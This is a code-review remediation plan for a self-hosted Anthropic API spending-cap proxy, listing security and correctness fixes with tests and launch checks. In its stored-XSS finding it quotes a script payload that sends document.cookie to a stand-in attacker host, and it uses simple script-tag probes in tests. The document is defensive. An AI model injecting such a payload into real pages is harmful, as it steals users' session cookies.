# Code-review remediation plan

Consolidated from two adversarial reviews (recent landing/dashboard scope + workspace-wide). Twenty-four findings deduped. Ordered by priority, with the fix, the verification step, and the model tier each step should run on.

Per `/Users/danlowry/Desktop/AI/CLAUDE.md`: every step is labelled with the cheapest model competent for the task. Escalate one tier if the step's premise turns out wrong on first attempt.

## Priority summary

| ID  | Severity | Title                                                       | Phase |
| --- | -------- | ----------------------------------------------------------- | ----- |
| C1  | Critical | Cap enforcement race under concurrency                      | 1     |
| C2  | Critical | Stored XSS in admin HTML pages via key name                 | 1     |
| C3  | Critical | Bcrypt linear-scan token verification per request           | 1     |
| M1  | Major    | Pricing fallback silently bills unknown models at Sonnet    | 2     |
| M2  | Major    | `tourniquet_cap_hit` stop_reason may break Anthropic SDKs   | 2     |
| M3  | Major    | SSE parser uses unset / stale `event_type`                  | 2     |
| M4  | Major    | No request body-size limit on `/v1/messages`                | 2     |
| M5  | Major    | Proxy strips `idempotency-key` header                       | 2     |
| M6  | Major    | Background `fan_out` task is fire-and-forget                | 2     |
| M7  | Major    | `update_cap` doesn't enforce cap ≤ absolute_ceiling         | 2     |
| M8  | Major    | `_sleep_protection_status` owner attribution wrong          | 2     |
| M9  | Major    | Linux / Windows sleep detection lies                        | 2     |
| m1  | Minor    | `_decrypt_anthropic_key` re-imports Fernet per request      | 3     |
| m2  | Minor    | `config.py` accepts unvalidated `fernet_key` / `secret_key` | 3     |
| m3  | Minor    | `enable_*_notifications` typed as `str` not `bool`          | 3     |
| m4  | Minor    | Sentry init runs after schema setup                         | 3     |
| m5  | Minor    | Magic-link reissue overwrites old token, error misleads     | 3     |
| m6  | Minor    | `lift-by-amount` `new_cap_after` dead code                  | 3     |
| m7  | Minor    | TOCTOU window in `_assert_token_unused`                     | 3     |
| m8  | Minor    | Dashboard Copy handler swallows clipboard rejection         | 3     |
| m9  | Minor    | `integration_snippets.html` hardcodes `http://`             | 3     |
| n1  | Nit      | `cost_pence` deprecated alias                               | 4     |
| n2  | Nit      | `import` inside functions                                   | 4     |
| n3  | Nit      | Duplicate `"profiles_obj"` key in `new_key_form`            | 4     |

Phases 1 and 2 must land before public launch. Phase 3 is cleanup. Phase 4 is housekeeping.

---

## Phase 1 — Block launch until fixed

### C1. Cap enforcement race under concurrency

**File:** `src/tourniquet/proxy/router.py:97-279`

**What's wrong.** `proxy_messages` reads `spent_cents` (line 102) and decides 402 or pass (line 111) using a READ session, then writes `add_spend` from a separate WRITE session at line 264 / 331. No row-lock, no `SELECT ... FOR UPDATE`, no transaction spanning read→decide→write. `caps.py:add_spend` makes the increment atomic; the check-and-act is not. Concurrent requests for the same key all observe the same stale `spent_cents`, all pass the cap check, all execute. The product's headline claim — "hard daily spend caps" — is a soft cap under realistic burst rates (e.g., Claude Code firing 5–20 parallel tool calls).

**Fix.** Atomic reservation pattern.
1. Estimate worst-case cost in the pre-flight guard (the code at `router.py:166-189` already does this; reuse).
2. Atomically attempt to reserve that cost in `caps_today`:
   ```python
   # billing/caps.py — new function
   async def reserve_or_reject(api_key_id, today, amount_cents, cap_cents, session) -> bool:
       """Atomic check-and-increment. Returns True on success, False if reservation
       would push spend over cap. Caller MUST commit the session for the reserve
       to take effect."""
       # Postgres / SQLite: ON CONFLICT DO UPDATE WHERE
       result = await session.execute(text("""
           INSERT INTO caps_today (api_key_id, date, total_usd_cents)
           VALUES (:kid, :d, :amt)
           ON CONFLICT (api_key_id, date) DO UPDATE
             SET total_usd_cents = caps_today.total_usd_cents + EXCLUDED.total_usd_cents
             WHERE caps_today.total_usd_cents + EXCLUDED.total_usd_cents <= :cap
           RETURNING total_usd_cents
       """), {"kid": str(api_key_id), "d": today, "amt": amount_cents, "cap": cap_cents})
       return result.first() is not None
   ```
3. After upstream completes, reconcile: subtract the over-estimate by adding `(actual_cost - reserved_cost)`, which can be negative.
4. If `reserve_or_reject` returns False, return 402 with the same `tourniquet_cap_hit` payload shape currently in use.
5. SQLite note: SQLite's `ON CONFLICT ... DO UPDATE WHERE` is supported from 3.24+; production runs Python 3.11 which bundles SQLite ≥3.40 — fine.

**Tests.** New `tests/test_proxy_concurrency.py`:
- `test_concurrent_requests_respect_cap` — fire 10 `asyncio.gather` requests at a $1.00 cap with $0.10/request worst-case; assert exactly N where `N×0.10 ≤ 1.00` succeed and the rest get 402.
- `test_streaming_reservation_reconciles_overestimate` — issue a streaming request whose worst-case is $0.50 but actual is $0.10; assert post-stream `caps_today.total` reflects $0.10, not $0.50.

**Model.** Opus — design judgment, blast radius is the entire product.

---

### C2. Stored XSS in admin HTML confirmation pages

**File:** `src/tourniquet/routes/admin.py:524-547, 589-615, 675-699, 752-761, 792-817, 847-862`

**What's wrong.** Every admin HTML response interpolates `key_name` (and `mode`, `current_cap`, etc.) directly into f-strings with no escaping. `key_name` is user-controlled via `POST /dashboard/keys/new` (`dashboard/routes.py:1079`, `name: str = Form(...)`, no sanitisation). A key named `<script>fetch('//attacker/'+document.cookie)</script>` renders the script every time a kill-now link is clicked — including from email, Slack, or Telegram. Threat model: pure-localhost is self-XSS only, but `docs/deploy.md` recommends Tailscale Funnel and cloud-VM scenarios where this is cross-origin XSS.

**Fix.** Move every admin HTML page to Jinja templates. Project convention everywhere else (`templates/dashboard.html`, `templates/key_rotated.html`, etc.) uses Jinja2 with autoescape on by default.

1. Create `src/tourniquet/templates/admin/`:
   - `kill_now_confirm.html`
   - `kill_now_applied.html`
   - `lift_mode_confirm.html`
   - `lift_mode_applied.html`
   - `lift_by_amount_confirm.html`
   - `lift_by_amount_applied.html`
2. Move each inline-CSS block to a shared `templates/admin/_layout.html` (extends `base.html` if base supports the styling, else a minimal admin base).
3. Replace each `return HTMLResponse(f"""...""")` with `templates.TemplateResponse(request, "admin/<name>.html", {...})`.
4. Add a `Jinja2Templates` instance at the top of `admin.py` mirroring `dashboard/routes.py:36-37`.

**Tests.** New `tests/test_admin_xss.py`:
- `test_kill_now_confirm_escapes_key_name` — create a key named `<script>x</script>`, hit `/admin/kill-now/{id}?token=...`, assert response body contains `&lt;script&gt;` and not `<script>`.
- Repeat for each admin HTML endpoint.

**Model.** Sonnet — mechanical refactor (six template extractions) but each migration is bounded.

---

### C3. Bcrypt linear-scan token verification per request

**Files:** `src/tourniquet/proxy/router.py:68-86`, `src/tourniquet/routes/admin.py:343-367`

**What's wrong.** Every authenticated proxy request loads ALL `ApiKey` rows and bcrypt-checks each in a loop until match. Comment claims a 1000-key limit; the code has no `LIMIT`. Bcrypt at default cost-12 is ~250ms per check. With 10 keys, 2.5s of CPU per request on auth alone. `tq_*` tokens are 32 bytes from `secrets.token_urlsafe(32)` (256 bits of entropy) — they are NOT user passwords. Bcrypt is the wrong primitive: it's slow on purpose for password hashing, and that slowness is now a DoS amplifier.

**Fix.** Switch tokens to indexed SHA-256 lookup with constant-time compare on the matched row.

1. **Schema migration** — add nullable column `tq_token_sha256: str | None` with a unique index. Keep `tq_token_hash` (bcrypt) for backward compat during rollout.
   ```python
   # New Alembic migration
   op.add_column("api_keys", sa.Column("tq_token_sha256", sa.String(64), nullable=True))
   op.create_index("ix_api_keys_tq_token_sha256", "api_keys", ["tq_token_sha256"], unique=True)
   ```
2. **Write path** — in `_make_tq_token` callers (`create_key`, `rotate_token`), populate both columns:
   ```python
   token = _make_tq_token()
   key.tq_token_hash = bcrypt.hashpw(token.encode(), bcrypt.gensalt()).decode()
   key.tq_token_sha256 = hashlib.sha256(token.encode()).hexdigest()
   ```
3. **Read path** — replace `_resolve_api_key` and `_resolve_and_auth`:
   ```python
   raw = auth_header.removeprefix("Bearer ").strip()
   sha = hashlib.sha256(raw.encode()).hexdigest()
   row = await session.execute(select(ApiKey).where(ApiKey.tq_token_sha256 == sha))
   key = row.scalar_one_or_none()
   if key is None:
       # Fallback: legacy bcrypt scan for keys created before migration
       key = await _legacy_bcrypt_scan(raw, session)
   if key is None:
       raise HTTPException(401, ...)
   ```
4. **One-shot upgrade** — when a legacy key matches via bcrypt scan, populate `tq_token_sha256` so subsequent requests hit the fast path.
5. **Drop bcrypt for tokens** in v0.2 once all installs have run the migration. Schedule a release-notes hint.

**Tests.** Extend `tests/test_proxy.py`:
- `test_proxy_auth_uses_sha256_lookup` — measure that `_resolve_api_key` issues exactly one SQL query.
- `test_legacy_bcrypt_token_still_works` — pre-seed a key with only `tq_token_hash`, confirm auth succeeds and `tq_token_sha256` gets backfilled.
- `test_proxy_auth_rejects_unknown_token` — submit junk token, assert 401 in <50ms (no bcrypt fanout).

**Model.** Sonnet — careful schema migration plus a backwards-compat shim. Escalate to Opus if the legacy fallback gets twisty.

---

## Phase 2 — Fix before launch

### M1. Pricing fallback silently bills unknown models at Sonnet rate

**File:** `src/tourniquet/billing/pricing.py:23, 28`

**What's wrong.** `_FALLBACK_RATE` is the Sonnet rate. When Anthropic ships `claude-opus-5-X` (which costs ~5× Sonnet), the proxy charges Sonnet rates. Cap fidelity collapses for new models. No log warning.

**Fix.** Three-part change.
1. Replace the silent fallback with a log warning, deduped per-model:
   ```python
   _UNKNOWN_MODELS_LOGGED: set[str] = set()
   def cost_usd_cents(model: str, ...) -> int:
       if model not in _RATES:
           if model not in _UNKNOWN_MODELS_LOGGED:
               log.warning("Unknown model %r — billing at fallback rate. Update pricing.py.", model)
               _UNKNOWN_MODELS_LOGGED.add(model)
       ...
   ```
2. Switch `_FALLBACK_RATE` to the *most expensive* model in `_RATES` so unknown models err pessimistic (cap fires earlier, not later). Pick Opus rates as the conservative baseline.
3. Add a `claude-haiku-4-7` placeholder entry pre-emptively if Anthropic's roadmap suggests it.

**Tests.** Extend `tests/test_pricing.py`:
- `test_unknown_model_uses_pessimistic_fallback` — assert `cost_usd_cents("claude-opus-99", 1000, 1000)` returns the Opus rate, not the Sonnet rate.
- `test_unknown_model_logs_warning_once` — assert `caplog` records the warning exactly once across multiple calls with the same model.

**Model.** Haiku — mechanical edit + two test cases.

---

### M2. `tourniquet_cap_hit` stop_reason may break Anthropic SDKs

**File:** `src/tourniquet/providers/anthropic.py:49-52`

**What's wrong.** The synthetic `message_stop` event carries `"stop_reason":"tourniquet_cap_hit"`. Anthropic's documented values are `end_turn|max_tokens|stop_sequence|tool_use`. Strict-validating SDKs (Pydantic on `anthropic`, Zod on `@anthropic-ai/sdk`) may raise on unknown values.

**Fix.** Two-step.
1. Set `stop_reason` to `"end_turn"` (the closest documented enum value) so SDKs don't reject the event.
2. Signal the cap-hit out-of-band:
   - Emit a separate `event: error` SSE block immediately after `message_stop` carrying the cap-hit JSON the README documents (`type: "tourniquet_cap_hit"`, cap, spent, resets_at).
   - Add a custom HTTP trailer / response header `X-Tourniquet-Cap-Hit: 1` for non-streaming clients.
3. Update README and `docs/api.md` to document the new shape.

**Tests.** Extend `tests/test_proxy.py`:
- `test_streaming_cap_hit_uses_documented_stop_reason` — assert `stop_reason` in the synthetic event is `"end_turn"`.
- `test_streaming_cap_hit_emits_tourniquet_error_event` — assert the SSE stream contains an `event: error` block with `type: tourniquet_cap_hit`.

**Model.** Sonnet — protocol compatibility judgment, low blast radius.

---

### M3. SSE parser uses unset / stale `event_type`

**File:** `src/tourniquet/providers/anthropic.py:80-89`

**What's wrong.** `event_type` is bound only inside the `if line.startswith("event:")` branch and never reset. (a) If the very first SSE line is `data:`, `acc.ingest_event(event_type, data)` raises `NameError`. (b) If multiple `data:` lines stream after a single `event:`, all are tagged with that event type — which is usually correct for Anthropic but breaks if the protocol drifts.

**Fix.**
```python
event_type = ""
async for line in resp.aiter_lines():
    if not line.strip():
        event_type = ""  # SSE blank line = event terminator
        continue
    if line.startswith("event:"):
        event_type = line[len("event:"):].strip()
    elif line.startswith("data:"):
        if not event_type:
            continue  # data without preceding event line — skip
        ...
```

**Tests.** Extend `tests/test_anthropic_provider.py`:
- `test_sse_parser_handles_data_without_preceding_event` — fixture with bare `data:` line, assert no NameError, no ingest.
- `test_sse_parser_resets_event_type_on_blank_line` — fixture with two events separated by blank line, assert each `data:` is tagged with its own event.

**Model.** Sonnet.

---

### M4. No request body-size limit on `/v1/messages`

**File:** `src/tourniquet/proxy/router.py:95`

**What's wrong.** `await request.body()` reads unbounded bytes into memory. A 1GB malicious payload OOMs the process. Reachable in `docs/deploy.md` Tailscale / cloud-VM scenarios.

**Fix.**
1. Add `max_request_body_bytes: int = 10_485_760` (10MiB) to `config.py` — generous for legitimate prompts, deterministic ceiling.
2. In `proxy_messages`, replace `body = await request.body()` with a streamed read enforcing the limit:
   ```python
   buf = bytearray()
   async for chunk in request.stream():
       buf.extend(chunk)
       if len(buf) > settings.max_request_body_bytes:
           raise HTTPException(413, detail="Request body exceeds configured limit.")
   body = bytes(buf)
   ```

**Tests.** Extend `tests/test_proxy.py`:
- `test_proxy_rejects_oversized_body` — POST with body > limit, assert 413.

**Model.** Haiku — mechanical change.

---

### M5. Proxy strips `idempotency-key` header

**Files:** `src/tourniquet/proxy/router.py:138-141`, `src/tourniquet/providers/anthropic.py:69-72`

**What's wrong.** Whitelist passes only `content-type`, `anthropic-version`, `anthropic-beta`. Anthropic supports idempotency keys; stripping them double-bills retries.

**Fix.** Extend the whitelist:
```python
_FORWARD_HEADERS = frozenset({
    "content-type", "anthropic-version", "anthropic-beta",
    "idempotency-key",  # Anthropic-specific retry safety
    "x-stainless-arch", "x-stainless-lang", "x-stainless-os",
    "x-stainless-package-version", "x-stainless-runtime",
    "x-stainless-runtime-version",  # SDK fingerprints — Anthropic uses these for support
})
```
Hoist to module scope (currently inlined in two places — one source of truth).

**Tests.** Extend `tests/test_proxy.py`:
- `test_proxy_forwards_idempotency_key` — assert the upstream-mock receives the header.

**Model.** Haiku.

---

### M6. Background `fan_out` task is fire-and-forget

**File:** `src/tourniquet/alerts/notifier.py:243`

**What's wrong.** `asyncio.create_task(_dispatch())` — no reference held. Python docs explicitly warn: the event loop only keeps weak references to tasks. Under GC pressure the alert dispatch can be silently cancelled mid-flight.

**Fix.**
```python
# Module scope
_pending_tasks: set[asyncio.Task] = set()

# Inside maybe_fire_threshold_alert:
t = asyncio.create_task(_dispatch())
_pending_tasks.add(t)
t.add_done_callback(_pending_tasks.discard)
```

**Tests.** Extend `tests/test_notifier.py`:
- `test_fan_out_task_is_referenced` — fire an alert, assert `len(_pending_tasks) == 1` immediately after, awaited and discarded once complete.

**Model.** Haiku.

---

### M7. `update_cap` doesn't enforce cap ≤ absolute_ceiling

**File:** `src/tourniquet/dashboard/routes.py:553-578`

**What's wrong.** `update_ceiling` rejects ceiling < cap (line 602-610). `update_cap` does NOT reject cap > ceiling. Invariant violation. `apply_suggestion_full` clamps (line 1021); manual edit doesn't.

**Fix.** After `_get_key_or_404`:
```python
if cents > key.absolute_ceiling_usd_cents:
    raise HTTPException(
        status_code=422,
        detail=(
            f"Cap ({format_money(cents, currency)}) cannot exceed absolute ceiling "
            f"({format_money(key.absolute_ceiling_usd_cents, currency)}). "
            "Raise the ceiling first."
        ),
    )
```

**Tests.** Extend `tests/test_dashboard.py`:
- `test_update_cap_rejects_above_ceiling` — POST with `daily_cap = ceiling + 1`, assert 422.

**Model.** Haiku.

---

### M8. `_sleep_protection_status` owner attribution wrong on real `pmset`

**File:** `src/tourniquet/dashboard/routes.py:279-290`

**What's wrong.** Parser sets `active=True` from the system-wide assertion summary, then matches the first per-process line containing `named:` regardless of which assertion that line represents. Verified live: returns `owner='Claude'` when WhatsApp's camera-capture assertion is the actual `PreventUserIdleSystemSleep` holder.

**Fix.** Require the matched per-process line to also mention the assertion type we set `active` on:
```python
elif active and "named:" in stripped.lower() and "PreventUserIdleSystemSleep" in stripped:
    if "caffeinate" in stripped.lower():
        owner = "caffeinate"
    else:
        owner = stripped.split("(", 1)[-1].split(")", 1)[0] if "(" in stripped else "unknown process"
    break
```

**Tests.** New `tests/test_sleep_protection.py`:
- `test_pmset_owner_filters_by_assertion_type` — fixture with a `pmset` output containing `Claude/NoIdleSleepAssertion` and `WhatsApp/PreventUserIdleSystemSleep`, assert owner = "WhatsApp".
- `test_pmset_caffeinate_owner_recognised` — fixture with `caffeinate` holding the assertion, assert owner = "caffeinate".

**Model.** Sonnet — string parsing of an external tool's output is exactly the kind of "ambiguous-but-bounded" task Sonnet tier targets.

---

### M9. Linux / Windows sleep detection lies

**File:** `src/tourniquet/dashboard/routes.py:293-297`, `templates/dashboard.html:75-77`

**What's wrong.** Linux returns `active=True, owner="no idle-sleep on this OS"` unconditionally — false for Linux laptops on battery. Windows hits the `"other"` branch and renders "always-on by default on this OS" — false for Windows laptops with default sleep policy. Both contradict `docs/deploy.md` and the landing page's cross-OS guidance.

**Fix.**
1. **Linux** — best-effort detect via `loginctl show-session` if available, else fall back to `active=False`. Honest "unknown" beats false confidence:
   ```python
   if sysname == "linux":
       try:
           result = subprocess.run(
               ["systemd-inhibit", "--list", "--no-pager"],
               capture_output=True, text=True, timeout=2, check=False,
           )
           if "tourniquet" in result.stdout.lower() or "idle:sleep" in result.stdout.lower():
               return {"platform": "linux", "active": True, "owner": "systemd-inhibit"}
       except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
           pass
       return {"platform": "linux", "active": False, "owner": ""}
   ```
2. **Windows** — detect via `powercfg /requests` (admin-only on some installs; tolerate failure):
   ```python
   if sysname == "windows":
       try:
           result = subprocess.run(
               ["powercfg", "/requests"],
               capture_output=True, text=True, timeout=2, check=False,
           )
           if "SYSTEM:" in result.stdout and "None." not in result.stdout.split("SYSTEM:")[1].split("\n")[1]:
               return {"platform": "windows", "active": True, "owner": "system-execution-state"}
       except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
           pass
       return {"platform": "windows", "active": False, "owner": ""}
   ```
3. **Template** — extend `dashboard.html:73-77` with platform-specific branches:
   ```jinja2
   {% elif sleep_protection.platform == 'linux' %}
     <button ...>Show how (systemd-inhibit)</button>
   {% elif sleep_protection.platform == 'windows' %}
     <button ...>Show how (PowerShell)</button>
   {% else %}
     <span class="channel-tier muted">— detection unavailable on this OS</span>
   {% endif %}
   ```
4. Add `templates/_partials/always_on_guide_linux.html` and `..._windows.html` mirroring the existing macOS guide.

**Tests.** Extend `tests/test_sleep_protection.py`:
- Mock `subprocess.run` for each branch and assert the returned dict shape.

**Model.** Sonnet — three OS code paths plus template work.

---

## Phase 3 — Cleanup

### m1. Hoist Fernet to module scope in proxy

**File:** `src/tourniquet/proxy/router.py:61-65`. `dashboard/routes.py:77` already does this — copy the pattern.
**Fix.** `_FERNET = Fernet(settings.fernet_key.encode())` at module scope. Inline the import. Function becomes one-liner.
**Model.** Haiku.

### m2. Validate `fernet_key` and `secret_key` at startup

**File:** `src/tourniquet/config.py:33-35`
**Fix.** Pydantic field validators:
```python
@field_validator("fernet_key")
@classmethod
def _validate_fernet(cls, v: str) -> str:
    try:
        Fernet(v.encode())
    except Exception as e:
        raise ValueError(f"FERNET_KEY invalid (must be 32 url-safe base64 bytes): {e}") from e
    return v

@field_validator("secret_key")
@classmethod
def _validate_secret(cls, v: str) -> str:
    if len(v.encode()) < 32:
        raise ValueError("SECRET_KEY must be at least 32 bytes")
    return v
```
**Tests.** Extend `tests/test_config.py` (create if absent): boot with bad keys, assert ValidationError at construction.
**Model.** Haiku.

### m3. Type `enable_*_notifications` as `bool`

**File:** `src/tourniquet/config.py:77-78` and consumers in `dashboard/routes.py:237-239`, `notifier.py:312-314`.
**Fix.** Change types to `bool = False`. Pydantic-settings handles `"true"`/`"1"`/`"yes"` env conversions natively. Update consumers to drop the `str(...).lower() == "true"` dance.
**Model.** Haiku.

### m4. Init Sentry before schema setup

**File:** `src/tourniquet/main.py:29-33`
**Fix.** Move the `if settings.sentry_dsn: sentry_sdk.init(...)` block to *before* the `engine.begin()` block in lifespan. Schema-creation errors then surface in Sentry.
**Model.** Haiku.

### m5. Magic-link reissue UX

**File:** `src/tourniquet/auth/magic_link.py:70`
**Fix.** Either (a) keep multiple outstanding tokens (more complex, requires a separate table), or (b) leave the single-column model and fix the error message to be honest:
```python
raise HTTPException(
    status_code=400,
    detail="This sign-in link is no longer valid. If you requested a new link, use the most recent email."
)
```
Pick (b) — minimal change, accurate.
**Model.** Haiku.

### m6. Remove `lift-by-amount` dead code

**File:** `src/tourniquet/routes/admin.py:791`
**Fix.** Delete `new_cap_after = min(current_cap + amount, 0)`. The variable is unused. The rendered HTML uses `(current_cap + amount) / 100:.2f` directly.
**Model.** Haiku.

### m7. Fix TOCTOU on `_assert_token_unused`

**File:** `src/tourniquet/routes/admin.py:567-571, 720-723, 839-843`
**Fix.** Add a unique constraint on `(api_key_id, action, details->>'token_sig')` in `api_key_actions`, OR move the unused-check inside the same transaction as the apply. Constraint approach is simpler:
```python
op.create_index(
    "ix_api_key_actions_unique_token",
    "api_key_actions",
    ["api_key_id", "action", text("(details->>'token_sig')")],
    unique=True,
    postgresql_where=text("details->>'token_sig' IS NOT NULL"),
)
```
SQLite-compat note: SQLite doesn't support `WHERE` clauses on unique indexes the same way. Use a CHECK or a partial index workaround for SQLite.
**Tests.** Extend `tests/test_action_link_replay.py`: fire two concurrent same-token POSTs, assert exactly one succeeds.
**Model.** Sonnet — schema migration plus concurrency test.

### m8. Catch clipboard rejection in dashboard Copy handler

**File:** `src/tourniquet/templates/_partials/copy_button_script.html:7`
**Fix.**
```javascript
navigator.clipboard.writeText(code.textContent.trim()).then(function() {
    var orig = btn.textContent;
    btn.textContent = '✓ Copied';
    setTimeout(function() { btn.textContent = orig; }, 1500);
}).catch(function() {
    var orig = btn.textContent;
    btn.textContent = '✗ Copy blocked';
    setTimeout(function() { btn.textContent = orig; }, 2000);
});
```
**Model.** Haiku.

### m9. Use request scheme in integration snippets

**File:** `src/tourniquet/templates/_partials/integration_snippets.html:5`
**Fix.**
```jinja2
{% set proxy_url = (request.url.scheme if request else "http") + "://" + (request.url.netloc if request else "127.0.0.1:8787") %}
```
**Model.** Haiku.

---

## Phase 4 — Nits

### n1. Delete `cost_pence` deprecated alias

**File:** `src/tourniquet/billing/pricing.py:35`. Confirm no callers, then delete.
**Verification.** `grep -rn cost_pence src/ tests/` returns nothing.
**Model.** Haiku.

### n2. Hoist function-local imports

**Files:** `src/tourniquet/dashboard/routes.py:263-264` (`platform`, `subprocess`), `src/tourniquet/proxy/router.py:62, 112, 191, 226, 270, 335` (various inline imports).
**Fix.** Move to module top. Convention everywhere else in the repo.
**Model.** Haiku.

### n3. Remove duplicate `"profiles_obj"` key

**File:** `src/tourniquet/dashboard/routes.py:1071-1072`. Delete one of the two lines.
**Model.** Haiku.

---

## Execution order

The phases are not strictly sequential — many fixes are independent and can be batched. Recommended order, with the model each batch should run on:

1. **Schema migrations first** (one Alembic file covering C3 + m7) — Sonnet. Generate, review, apply locally, run full test suite.
2. **C3 token-auth refactor** — Sonnet. Wire SHA-256 lookup with bcrypt fallback. Verify auth tests.
3. **C1 cap-reservation refactor** — Opus. Highest-judgment item. Get the SQL + reconciliation right; concurrency tests are the proof.
4. **C2 admin XSS refactor** — Sonnet. Six template extractions plus tests.
5. **Phase 2 batch (M1–M9)** — split:
   - M1, M4, M5, M7: Haiku — mechanical edits with tests.
   - M2, M3, M8, M9: Sonnet — protocol/parser judgment.
   - M6: Haiku.
6. **Phase 3 batch (m1–m9)** — single commit per item, all Haiku except m7 (Sonnet, schema-related).
7. **Phase 4 nits** — Haiku, single sweep commit.

Each phase ends with `python -m pytest -q` green and a `git status` showing the expected file set. No commits are merged until the matching tests in that phase exist and pass.

## Out-of-scope items the reviews surfaced but won't fix here

- The 9 RuntimeWarnings on async-mock leaks in tests — separate cleanup; fixing them requires reworking `test_admin_kill_now.py` and `test_telegram_poller.py` mocks. Track as a follow-up.
- Cache-pricing differential (`cache_creation_input_tokens`, `cache_read_input_tokens`) ignored by `pricing.py` — over-bills cache reads, so cap is conservative; fail-safe direction. Track as v0.2 enhancement.
- A written threat model document distinguishing "localhost-only" from "Tailscale/Funnel" deployment trust assumptions — this plan addresses the code; the doc is a separate deliverable. Likely belongs in `docs/security-model.md`.

## Verification gates before launch

- [ ] `pytest -q` — 180+ passing, plus the new tests added per fix above.
- [ ] `mypy --strict` — clean across `src/tourniquet/`.
- [ ] `ruff check src/ tests/` — clean.
- [ ] Manual: create a key named `<script>alert(1)</script>`, click every admin link from email/Slack/Telegram, confirm no script execution.
- [ ] Manual: fire 20 concurrent `curl` requests at a $1 cap with $0.10 per-request worst-case; assert post-run `caps_today.total ≤ 1.00`.
- [ ] Manual: time `_resolve_api_key` with 1, 10, 100 keys; assert latency stays flat (<10ms each).
- [ ] Manual: rename a model in pricing.py to a non-existent one, fire a request, confirm log warning surfaces and cap fires at the new fallback rate.
